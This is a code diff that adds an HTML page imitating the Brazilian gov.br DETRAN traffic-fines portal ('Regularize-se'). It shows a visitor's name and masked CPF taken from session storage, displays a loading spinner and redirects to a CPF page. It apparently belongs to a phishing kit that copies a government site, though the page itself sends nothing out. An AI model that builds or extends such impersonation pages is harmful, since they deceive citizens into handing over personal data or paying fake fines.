@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularize-se | DETRAN</title>
+    <link rel="icon" type="image/x-icon" href="../index_files/favicon.ico">
+    <link rel="stylesheet" href="../index_files/index-D3hvFbL-.css">
+    <script src="../vendor/tailwindcss.js"></script>
+</head>
+<body class="bg-gray-50 overflow-x-hidden">
+    <div id="root" class="min-h-screen bg-gray-50">
+        <header class="bg-white shadow-sm border-b fixed top-0 left-0 right-0 z-50">
+            <div class="max-w-7xl mx-auto px-3 sm:px-4 h-14 flex items-center justify-between gap-2">
+                <div class="flex items-center overflow-hidden min-w-0 flex-1">
+                    <a class="flex items-center flex-shrink-0" href="#"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="h-5 sm:h-6"></a>
+                    <div class="ml-2 pl-2 sm:ml-4 sm:pl-4 border-l border-gray-300 min-w-0 overflow-hidden">
+                        <h1 class="text-[11px] sm:text-sm font-medium text-gray-900 truncate">Sistema de Infrações e Multas</h1>
+                        <p class="hidden sm:block text-xs text-gray-600 truncate">DETRAN - Departamento de Trânsito</p>
+                    </div>
+                </div>
+                <div class="flex items-center flex-shrink-0">
+                    <button class="p-1 sm:p-2 text-gray-600 hover:text-gray-900 relative" aria-label="Notificações">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 sm:w-5 sm:h-5">
+                            <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"></path>
+                            <path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"></path>
+                        </svg>
+                    </button>
+                    <div class="hidden sm:block text-right mr-3">
+                        <p id="top-name" class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis max-w-[180px]"></p>
+                        <p id="top-cpf" class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis max-w-[180px]"></p>
+                    </div>
+                    <div id="avatar" class="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-purple-700 flex items-center justify-center text-white font-medium text-xs sm:text-sm">--</div>
+                </div>
+            </div>
+        </header>
+
+        <main class="max-w-3xl mx-auto px-3 sm:px-4 py-4 mt-20 sm:mt-24">
+            <div class="bg-white rounded-lg shadow-sm border p-6 text-center">
+                <div class="mx-auto mb-4 h-10 w-10 rounded-full border-4 border-blue-200 border-t-blue-700 animate-spin"></div>
+                <p class="text-base font-medium text-gray-900">Carregando informações pessoais...</p>
+                <p class="text-sm text-gray-600 mt-1">Aguarde alguns instantes</p>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        function initials(name) {
+            const parts = (name || '').trim().split(/\s+/).filter(Boolean);
+            if (!parts.length) return '--';
+            if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
+            return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
+        }
+
+        const payload = JSON.parse(sessionStorage.getItem('cpf_lookup_payload') || 'null');
+        const body = payload && payload.body ? payload.body : {};
+        const nome = body.name || '';
+        const cpf = body.cpf_masked || '';
+        const params = new URLSearchParams(window.location.search);
+        const id = params.get('id') || '';
+
+        document.querySelector('#top-name').textContent = nome;
+        document.querySelector('#top-cpf').textContent = cpf;
+        document.querySelector('#avatar').textContent = initials(nome);
+
+        if (!sessionStorage.getItem('cpf_lookup_cpf')) {
+            window.location.replace('home.html');
+        } else {
+            setTimeout(function () {
+                window.location.replace(`cpf.html?id=${encodeURIComponent(id)}`);
+            }, 2300);
+        }
+    </script>
+</body>
+</html>
